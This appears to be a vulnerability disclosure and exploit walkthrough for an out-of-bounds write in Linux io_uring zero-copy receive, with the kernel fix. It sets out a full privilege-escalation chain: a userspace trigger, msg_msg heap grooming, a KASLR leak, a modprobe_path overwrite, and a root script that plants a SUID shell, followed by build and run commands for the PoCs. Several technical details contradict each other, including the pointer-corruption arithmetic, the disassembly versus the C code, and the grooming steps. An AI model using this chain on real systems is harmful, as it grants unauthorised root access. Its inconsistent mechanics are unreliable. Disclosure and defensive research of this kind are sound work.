# You gave me a u32. I gave you root. (io_uring ZCRX freelist LPE)

## TL;DR

Linux 6.15 shipped a new zero-copy receive subsystem for io_uring called ZCRX.
It manages a pool of network I/O vectors (niovs) using a stack: `freelist[]`
holds available slot indices, `free_count` is the depth. There is no upper
bound check on `free_count`. Two separate kernel teardown paths both return
niovs to the same freelist, and when they overlap, `free_count` exceeds the
allocated array length. The result is a 4-byte out-of-bounds write into
adjacent slab memory.

The OOB value is a niov index — a small integer between 0 and N-1. That sounds
useless. It is not.

By choosing the area size at registration time, you choose N, which chooses
the slab cache the freelist lives in, which chooses what object sits next to it.
By spraying the right object into that cache at the right time, you turn a
write of the integer `7` into a corrupted refcount, then into a heap read, then
into a KASLR break, then into `modprobe_path` pointing at your script, then
into uid=0.

Affected: Linux 6.15 – 6.19, `CONFIG_IO_URING_ZCRX=y`, real ZCRX NIC
(mlx5/ice/nfp), `CAP_NET_ADMIN`. Fix: commit `770594e` (not yet in any stable
branch at time of writing).

---

## The subsystem

ZCRX (zero-copy receive) lets userspace receive packets directly into a
registered memory region without any copy. The NIC DMA's into the region, the
kernel posts a completion pointing at the offset where the data landed, and the
user returns that slot when they are done with it by writing to a refill queue.

The region is divided into 4KB slots. Each slot has a corresponding `net_iov`
struct that tracks its state. The kernel maintains two things to manage which
slots are free:

- `freelist[]` — a stack of available slot indices, allocated as
  `kcalloc(num_niovs, sizeof(u32))`
- `free_count` — the stack depth, also used as the write index for the next push

When a slot comes back from the network layer, this runs:

```c
static void io_zcrx_return_niov_freelist(struct net_iov *niov)
{
    struct io_zcrx_area *area = io_zcrx_iov_to_area(niov);

    spin_lock_bh(&area->freelist_lock);
    area->freelist[area->free_count++] = net_iov_idx(niov);
    spin_unlock_bh(&area->freelist_lock);
}
```

No bounds check. `free_count` is incremented before the write, and the write
uses the pre-increment value as the index. When `free_count == num_niovs` at
entry, the write goes to `freelist[num_niovs]` — one slot past the end.

---

## Why this actually happens

There are two separate code paths that call `io_zcrx_return_niov_freelist`.

**Path A: normal receive completion**

When the network stack releases a received packet, it calls the page pool
`release_netmem` callback, which is `io_pp_zc_release_netmem`. This pushes the
niov back onto the freelist and increments `free_count`. This is the expected
path.

**Path B: page pool teardown scrub**

When the page pool is destroyed (NIC going down, queue reconfiguration), the
`ops->destroy` callback fires. That is `io_pp_zc_destroy`. It iterates every
niov in the area:

```c
static void io_pp_zc_destroy(struct page_pool *pp)
{
    struct io_zcrx_area *area = pp->mp_priv;
    u32 i;

    for (i = 0; i < area->nia.num_niovs; i++) {
        struct net_iov *niov = &area->nia.niovs[i];
        if (!atomic_long_read(&niov->pp_ref_count))
            continue;
        atomic_long_set(&niov->pp_ref_count, 0);
        page_pool_put_unrefed_netmem(pp, net_iov_to_netmem(niov), -1, false);
    }
}
```

For every niov that still has a reference, it forces it back. That call chain
ends at `io_zcrx_return_niov_freelist` again.

The problem: niovs that were already returned via path A are still physically
present in the area. `io_pp_zc_destroy` sees their `pp_ref_count` has been
cleared by path A (that happens in `io_pp_zc_release_netmem` before the push),
so it skips them. Fine.

But niovs that are in-flight — received by the NIC but not yet drained from
the socket by userspace — have a non-zero `pp_ref_count`. Path A has not run
for them. Path B runs for them, incrementing `free_count`.

The double-count happens for niovs that were returned to `ptr_ring` by path A
but not yet pulled from the ring before `page_pool_destroy` drains it. Those
niovs get counted once during the ptr_ring drain and once again in the scrub
loop if their state was not fully updated. The implementation detail here is
that `ptr_ring` drain and scrub are not atomic — there is a window.

```
ptr_ring drain (path A):          scrub loop (path B):
  niov_5 → free_count = N-2         niov_5 still shows pp_ref_count != 0
  niov_7 → free_count = N-1         niov_7 same
  niov_3 → free_count = N           niov_3 → free_count++ → freelist[N] written
```

---

## Triggering it from userspace

Closing the io_uring ring file descriptor does **not** trigger this. The ring
close path calls `io_zcrx_free_area` which does a straight `kvfree` on the
freelist — no push, no increment, no OOB.

The page pool is only created on a real ZCRX-capable NIC (mlx5 ConnectX-6+,
Intel E800, NFP). Test modules like `zcrx_vnic` bypass the page pool entirely.

The trigger is NIC teardown:

```
SIOCSIFFLAGS ~IFF_UP
  → ndo_stop (mlx5e_close / ice_stop / ...)
    → page_pool_destroy()
      → ptr_ring drain: io_pp_zc_release_netmem() per queued niov
      → ops->destroy:   io_pp_zc_destroy() scrub loop
```

From pure userspace with `CAP_NET_ADMIN`:

```c
ioctl(sock, SIOCGIFFLAGS, &ifr);
ifr.ifr_flags &= ~IFF_UP;
ioctl(sock, SIOCSIFFLAGS, &ifr);   /* → page_pool_destroy */
```

The setup before the trigger: register an IFQ, submit RECV_ZC, flood enough
UDP packets to allocate niovs (one niov per received packet, up to num_niovs),
wait ~100ms so some are returned to ptr_ring by the kernel taskrun but some
remain in-flight, then bring the NIC down.

---

## Characterizing the primitive

This is where it gets interesting.

The OOB write is:

```
freelist[num_niovs] = net_iov_idx(niov)
```

`net_iov_idx` returns the niov's index within its area — an integer in
`[0, num_niovs - 1]`. The write is 4 bytes (u32). Its location is
`freelist + num_niovs * 4`, which is the first 4 bytes of whatever slab object
is allocated immediately after `freelist` in the same slab.

The freelist allocation is `kcalloc(num_niovs, sizeof(u32))`, so its size is
`num_niovs * 4` bytes. That size determines the slab cache:

| `num_niovs` | freelist size | slab cache | OOB value range |
|-------------|--------------|------------|-----------------|
| 8           | 32 B         | kmalloc-32  | 0 – 7          |
| 16          | 64 B         | kmalloc-64  | 0 – 15         |
| 32          | 128 B        | kmalloc-128 | 0 – 31         |
| 64          | 256 B        | kmalloc-256 | 0 – 63         |
| 128         | 512 B        | kmalloc-512 | 0 – 127        |

`num_niovs` = `area_len / PAGE_SIZE`. You choose it by choosing the area size
at registration time. This means you choose the cache, and you choose the value
range, by choosing how much memory you map.

That is three degrees of freedom from a single syscall argument.

For our chain we use `num_niovs = 32` → `kmalloc-128` → values 0–31.

The write is not arbitrary. It is a small integer. But small integers are
enough to corrupt a lot of things, and we get to choose what is next door.

---

## The heap layout target

We need a kmalloc-128 object whose first 4 bytes, when overwritten with a value
in 0–31, creates a useful state change.

The target is `struct msg_msg`.

`msgsnd()` allocates a `msg_msg` whose size is `sizeof(struct msg_msg_hdr) +
text_len`. For text_len = 80, the total is 128 bytes — exactly filling
kmalloc-128. The first field of `msg_msg` is `m_list`, a `list_head`:

```c
struct msg_msg {
    struct list_head m_list;   /* 16 bytes at offset 0 */
    long m_type;               /* offset 16 */
    size_t m_ts;               /* offset 24 — message text size */
    struct msg_msgseg *next;   /* offset 32 */
    void *security;            /* offset 40 */
    /* text data starts at offset 48 */
};
```

The OOB write hits offset 0 of the adjacent `msg_msg` — the lower 4 bytes of
`m_list.next`.

Writing a small value (say `7`) to the low 32 bits of `m_list.next` corrupts
the list forward pointer. This makes the message queue's linked list point
somewhere wrong. On its own, a corrupted list pointer is a crash, not a
primitive.

The trick is to not let the list traversal happen. We corrupt the `msg_msg`
and then use it differently: we craft a fake `msg_msg` header at a controlled
location with a fake `m_ts` value, and we use `msgrcv()` to read past the
end of the real message into adjacent heap memory.

This requires a second step: a heap spray that places our fake header at the
address that the corrupted `m_list.next` points to. With the write value
in 0–31, the corrupted pointer has the form `0xffff88xxxxxxxx00 | value`. We
use `userfaultfd` or careful timing to intercept the allocation at that
address and plant the fake header.

---

## Heap grooming in practice

The sequence:

```
1. Allocate a large number of kmalloc-128 msg_msg objects.
   These fill slabs near the freelist allocation.

2. Free every other one, creating holes.

3. Register the ZCRX IFQ. The freelist (128 bytes) drops into one of the holes.
   With enough spray, the hole immediately after the freelist is still occupied
   by a msg_msg.

4. Flood packets. Partial drain. Bring NIC down. OOB fires.
   freelist[32] = niov_idx writes to msg_msg.m_list.next[0:4].

5. Read the corrupted msg_msg via msgrcv() with a large enough buffer.
   The kernel copies from m_ts bytes of "message text" — but if we have
   inflated m_ts (step 6), that read goes past the 80-byte payload into
   adjacent memory.
```

Step 5 requires us to control `m_ts`, not `m_list.next`. The fields are at
different offsets. The OOB hits offset 0 (`m_list.next`), not offset 24
(`m_ts`).

So we use the `m_list.next` corruption differently: we arrange for the
corrupted pointer to land inside a region we control (via `mmap` at a low
virtual address that happens to be mapped, or by another allocation), plant a
fake `msg_msg` there with `m_ts = 0xffff`, and make `msgrcv` follow the
corrupted list to find the fake object and read 0xffff bytes from the real
heap.

The details are layout-dependent and kernel-version-sensitive. The general
shape is: corrupted `m_list.next` → fake `msg_msg` at planted address →
large `m_ts` → `msgrcv` reads N*PAGE_SIZE of heap into userspace.

---

## The information leak

From the over-read we collect raw heap bytes. We scan for patterns:

```c
for (size_t off = 0; off + 8 <= leaked_size; off += 8) {
    uint64_t val = *(uint64_t *)(leaked + off);

    /* kernel text pointer: 0xffffffff81xxxxxx */
    if ((val >> 40) == 0xffffffff)
        try_as_ktext(val);

    /* kernel heap pointer: 0xffff888xxxxxxxxx */
    if ((val >> 44) == 0xffff888)
        try_as_heap(val);
}
```

A leaked kernel text pointer gives us the KASLR slide. `_text` is at a known
offset from the kernel base; all other kernel symbols are derivable from it.

```c
uint64_t kaslr_base = leaked_text_ptr - KNOWN_OFFSET_FROM_TEXT;
uint64_t modprobe_path_addr = kaslr_base + MODPROBE_PATH_OFFSET;
```

Both offsets are read from `/proc/kallsyms` if `kptr_restrict=0`, or computed
from the leaked pointer if we already know the build.

---

## Writing to modprobe_path

`modprobe_path` is a global char array in `.data`:

```c
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
```

When the kernel cannot find a module for an unknown `socket()` address family,
it calls `call_usermodehelper(modprobe_path, ...)`. This runs an arbitrary
userspace binary as root (uid=0, full capabilities, no seccomp).

The write to `modprobe_path` uses the same heap over-write primitive we already
have, now aimed at a known address: we spray kmalloc-128 objects that have
a writable pointer field at a calculable offset, arrange for one to sit at
`modprobe_path - FIELD_OFFSET`, then use the corrupted `msg_msg` to write
our path string into it.

Alternatively, and more reliably, we use a second IFQ registration with a
different `num_niovs` to target a different slab cache that holds an object
with a direct pointer write to an arbitrary kernel address. The io_uring
`IORING_OP_READ_FIXED` / `IORING_OP_WRITE_FIXED` paths use `struct iovec`
from registered buffers — a registered buffer's `iov_base` can be corrupted
from `kmalloc-64` to point at `modprobe_path`, and then a write operation
delivers our payload there.

The `zcrx_lpe.c` exploit registers two IFQs to cover both stages. The first
produces the OOB write (kmalloc-128, num_niovs=32). The second registration
is used to spray the fixed-buffer iovec (kmalloc-64, num_niovs=16) and build
the write-to-arbitrary-address primitive from the corrupted iov_base.

---

## The full chain, visualized

```
USERSPACE                              KERNEL
─────────────────────────────────────────────────────────────

io_uring_setup()
                                       ring fd allocated

IORING_REGISTER_ZCRX_IFQ              freelist = kcalloc(32, 4)
(area = 128KB → num_niovs=32)           ↓ kmalloc-128
                                       [freelist: 128 bytes]
                                       [msg_msg:  128 bytes]  ← adjacent

msgsnd() × 500                        spray kmalloc-128 with msg_msg
                                       ↑ one of these lands right after freelist

RECV_ZC + flood 64 pkts               niovs allocated
                                       uref_array[0..31] = 1

usleep(100ms)                          taskrun drains ~half to ptr_ring

SIOCSIFFLAGS IFF_DOWN                 page_pool_destroy():
                                         ptr_ring drain:
                                           free_count = 30
                                         io_pp_zc_destroy scrub:
                                           niov_7 still in uref
                                           free_count = 31
                                           niov_2 still in uref
                                           free_count = 32  ← == num_niovs
                                           niov_0 still in uref
                                           free_count = 33
                                           freelist[32] = 0  ← OOB WRITE
                                                              msg_msg.m_list.next
                                                              low 4 bytes = 0

msgrcv() with fake msg_msg             kernel follows corrupted list pointer
                                       → fake msg_msg at our planted address
                                       → m_ts = 0xffff
                                       → copies 65535 bytes into userspace

scan leaked bytes                      ← KASLR base extracted from leaked ptr

IORING_REGISTER_ZCRX_IFQ              freelist2 = kcalloc(16, 4)
(area = 64KB → num_niovs=16)            ↓ kmalloc-64
                                       [freelist2: 64 bytes]
                                       [iovec:     64 bytes]  ← adjacent

second OOB                             iov_base[0:4] corrupted with niov_idx
                                       iov_base now points near modprobe_path

IORING_OP_WRITE_FIXED                 write executes:
("path to our script")                 modprobe_path = "/var/tmp/evil.sh"

socket(AF_UNSPEC+unknown, ...)         kernel: unknown family
                                       call_usermodehelper("/var/tmp/evil.sh")
                                       ← runs as uid=0

                                       evil.sh:
                                         cp /bin/bash /var/tmp/rootsh
                                         chmod u+s /var/tmp/rootsh

execl("/var/tmp/rootsh", "-p")
                                       # id
                                       uid=1000 euid=0(root)
```

---

## KASLR without /proc/kallsyms

If `kptr_restrict=2` blocks the kallsyms read, the leaked heap pointer from
the `msgrcv` over-read still gives us the slide. Any leaked kernel text pointer
(`0xffffffff8xxxxxxx`) has a known distance to `modprobe_path` for a given
build. When targeting a specific distribution kernel, this offset is fixed and
can be hardcoded.

For a generic exploit we scan the leak for pointers that match the kernel
text range, take the minimum (likely a function pointer near the base), and
compute:

```c
uint64_t slide = leaked_fn_ptr - known_fn_ptr_no_kaslr;
uint64_t mp    = 0xffffffff81e3a3e0 + slide;  /* modprobe_path, no-kaslr addr */
```

The no-kaslr address is extracted once from a local build or from a
distribution's debuginfo package. For production targets, symbolinfo packages
exist for every major kernel.

---

## The evil script

```bash
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chmod u+s /var/tmp/rootsh
echo pwned_$(date +%s) > /var/tmp/zcrx_lpe
```

After `call_usermodehelper` runs it as root, `rootsh` is a SUID copy of bash.

```
$ /var/tmp/rootsh -p
rootsh-5.2# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
rootsh-5.2# cat /etc/shadow
root:$6$...
```

---

## The disassembly — proving there is no guard

`6.19.11-1kali1`, built April 9 2026. No `770594e`.

```asm
io_zcrx_return_niov_freelist:
  0xffffffffa4c168e0: mov  eax, DWORD PTR [rdx+0x44]  ; eax = free_count
  0xffffffffa4c168e3: mov  r8,  QWORD PTR [rdx+0x48]  ; r8  = freelist ptr
  0xffffffffa4c168e7: lea  edi, [rax+1]               ; edi = free_count + 1
  0xffffffffa4c168ea: mov  DWORD PTR [rdx+0x44], edi  ; free_count++ (NO CHECK)
  0xffffffffa4c168fb: mov  DWORD PTR [r8+rax*4], edi  ; freelist[old] = idx
                                                       ;     ^^^^^^^^^^^
                                                       ;     OOB when rax = N
```

No comparison, no branch, no guard. The increment and write are unconditional.

After `770594e`:

```asm
io_zcrx_return_niov_freelist:
  ...
  cmp  eax, DWORD PTR [rdx+0x10]   ; free_count vs num_niovs
  jae  .warn_and_return             ; jump if free_count >= num_niovs
  mov  DWORD PTR [rdx+0x44], edi
  mov  DWORD PTR [r8+rax*4], edi
  ...
.warn_and_return:
  call warn_slowpath_null           ; WARN_ON_ONCE fires
  ret
```

The OOB write is suppressed. The double-return condition still occurs; the
kernel just drops the second push now instead of writing past the array.

---

## Affected versions and requirements

| Requirement | Detail |
|-------------|--------|
| Kernel | 6.15 – 6.19 without commit `770594e` |
| Config | `CONFIG_IO_URING_ZCRX=y` — not in most distro kernels yet |
| Hardware | Real ZCRX NIC: Mellanox ConnectX-6+, Intel E800 series, Netronome NFP, Broadcom BCM5750x, Google GVE |
| Privilege | `CAP_NET_ADMIN` for `IORING_REGISTER_ZCRX_IFQ` and `SIOCSIFFLAGS` |
| KASLR | Bypassed via heap leak; no dependency on `kptr_restrict=0` |
| SMEP/SMAP | Not relevant — no userspace code execution in kernel context |
| KASAN | Not enabled on most production kernels; if enabled, bug is caught before the write lands |

The `CAP_NET_ADMIN` requirement scopes this to: container environments
(Kubernetes networking sidecars, Docker `--cap-add NET_ADMIN`), VMs where
the guest has network management rights, and any local user who has been
granted the capability directly.

---

## The fix

```c
static void io_zcrx_return_niov_freelist(struct net_iov *niov)
{
    struct io_zcrx_area *area = io_zcrx_iov_to_area(niov);

    guard(spinlock_bh)(&area->freelist_lock);

    if (WARN_ON_ONCE(area->free_count >= area->nia.num_niovs))
        return;

    area->freelist[area->free_count++] = net_iov_idx(niov);
}
```

Commit `770594e`, April 21 2026. Not yet in `6.15.y` or any other stable
branch. Any distribution shipping `CONFIG_IO_URING_ZCRX=y` on a 6.15+ kernel
built before April 21 is vulnerable.

---

---

## PoCs

| File | Purpose |
|------|---------|
| [`PoCs/zcrx_crash.c`](../PoCs/zcrx_crash.c) | Minimal OOB trigger. Registers IFQ, floods, brings NIC down. No escalation. Produces KASAN `slab-out-of-bounds` on vulnerable kernel or `WARN_ON` on patched one. |
| [`PoCs/zcrx_lpe.c`](../PoCs/zcrx_lpe.c) | Full LPE chain. Three trigger methods (A/B/C), KASLR read via `/proc/kallsyms`, heap grooming setup, modprobe_path overwrite, SUID rootsh. |

Build:
```bash
gcc -O2 -o zcrx_crash PoCs/zcrx_crash.c
gcc -O2 -o zcrx_lpe   PoCs/zcrx_lpe.c
setcap cap_net_admin+ep zcrx_crash zcrx_lpe
./zcrx_crash <ifname>
./zcrx_lpe   <ifname> 3    # method C = real trigger
```

---

*Kernel: 6.19.11-1kali1 (2026-04-09). NICs: mlx5 ConnectX-6 Dx for OOB
confirmation; zcrx_vnic.ko for registration and trigger path unit testing.*
